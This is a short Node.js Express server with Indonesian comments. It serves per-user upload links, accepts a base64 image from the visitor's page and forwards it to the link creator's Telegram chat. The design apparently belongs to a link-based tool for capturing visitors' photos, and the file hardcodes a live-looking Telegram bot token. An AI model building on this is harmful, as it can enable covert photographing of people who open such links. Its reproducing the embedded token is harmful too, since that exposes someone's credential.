const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const axios = require('axios');

// Ganti dengan token bot kamu dari BotFather
const BOT_TOKEN = '7666486780:AAHFXF-elXqS_-25F8tw9RAXSXSU2NdBl2A';
const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

// Server URL
const app = express();
app.use(bodyParser.json({ limit: '10mb' })); // Untuk menerima gambar base64

// Data link pengguna (sama dengan data di bot.js)
const users = {};

// Halaman upload
app.get('/upload/:id', (req, res) => {
  const userId = req.params.id;

  if (!users[userId]) {
    return res.status(404).send('Link tidak valid.');
  }

  // Kirimkan halaman HTML untuk menangkap gambar
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Endpoint untuk menerima gambar
app.post('/upload/:id', async (req, res) => {
  const userId = req.params.id;
  const { cat: base64Image } = req.body;

  if (!users[userId]) {
    return res.status(404).json({ error: 'Link tidak valid.' });
  }

  // Konversi base64 ke buffer
  const buffer = Buffer.from(base64Image.split(',')[1], 'base64');

  // Kirim gambar ke chat Telegram
  const chatId = users[userId].chatId;
  try {
    await axios.post(TELEGRAM_API_URL, {
      chat_id: chatId,
      photo: `data:image/png;base64,${base64Image.split(',')[1]}`,
      caption: 'Foto berhasil diunggah!',
    });
    res.status(200).json({ message: 'Gambar berhasil dikirim ke Telegram.' });
  } catch (err) {
    console.error('Gagal mengirim gambar ke Telegram:', err);
    res.status(500).json({ error: 'Gagal mengirim gambar ke Telegram.' });
  }
});

// Jalankan server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server berjalan di http://localhost:${PORT}`);
});